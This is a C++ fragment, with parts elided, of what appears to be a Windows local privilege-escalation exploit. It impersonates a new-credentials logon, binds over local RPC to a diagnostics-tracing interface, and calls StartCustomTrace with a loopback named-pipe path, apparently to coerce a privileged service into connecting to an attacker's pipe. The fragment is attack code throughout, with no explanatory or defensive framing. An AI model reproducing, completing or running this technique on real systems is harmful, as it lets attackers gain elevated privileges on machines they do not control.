...
DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam)
{
	...
	// before trigger, we should use INTERACTIVE SID 
	HANDLE pHandle;
	if (!LogonUserW(L"seclogon", L".", L"seclogon", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &pHandle))
	{
		wprintf(L"[-]LogonUser Failed status: %d\n", GetLastError());
		return 0;
	}
	if (!ImpersonateLoggedOnUser(pHandle)) {
		wprintf(L"[-]ImpersonateLoggedOnUser Failed status: %d\n", GetLastError());
		return 0;
	}
	...
	status = RpcStringBindingCompose(
		(RPC_WSTR)L"4c9dbf19-d39e-4bb9-90ee-8f7179b20283",
		(RPC_WSTR)L"ncalrpc",
		nullptr,
		nullptr,
		nullptr,
	...
	RpcTryExcept
	{
		...
		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1\\pipe\\%ws", pwszPipeName);
		//wprintf(pwszFileName);
		long long num1 = 101;
		/* Trigger function to achieve RPC communication */
		status = Proc19_UtcApi_StartCustomTrace(BindingHandle,pwszFileName,num1);
		//status = Proc20_UtcApi_SnapCustomTrace(BindingHandle, pwszFileName);
		wprintf(L"Proc19_UtcApi_StartCustomTrace:%d\n", status);
